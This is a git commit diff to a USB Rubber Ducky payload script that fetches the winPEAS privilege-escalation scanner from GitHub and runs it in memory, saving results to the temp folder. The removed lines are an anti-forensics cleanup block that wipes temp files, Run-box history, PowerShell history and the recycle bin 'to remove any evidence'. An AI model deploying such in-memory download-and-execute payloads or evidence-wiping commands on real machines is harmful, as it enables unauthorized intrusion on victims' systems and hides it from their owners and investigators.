56af7bf52dfdff2f3c1e846c1d2c6ce9f9a123b4
FalsePhilosopher <joshgarland90@gmail.com>
2022-10-12 16:10:01 -0600

    winpeasupdate

--- Ducky/USBRubberducky/library/recon/Win/Winpeas/WPL.ps1
+++ Ducky/USBRubberducky/library/recon/Win/Winpeas/WPL.ps1
@@ -7,23 +7,4 @@ $url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS
 # One liner to download and execute winPEASany from memory in a PS shell
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") >> $env:TMP\$FileName
 
-<#
-.NOTES
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
 
-# Delete contents of Temp folder
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
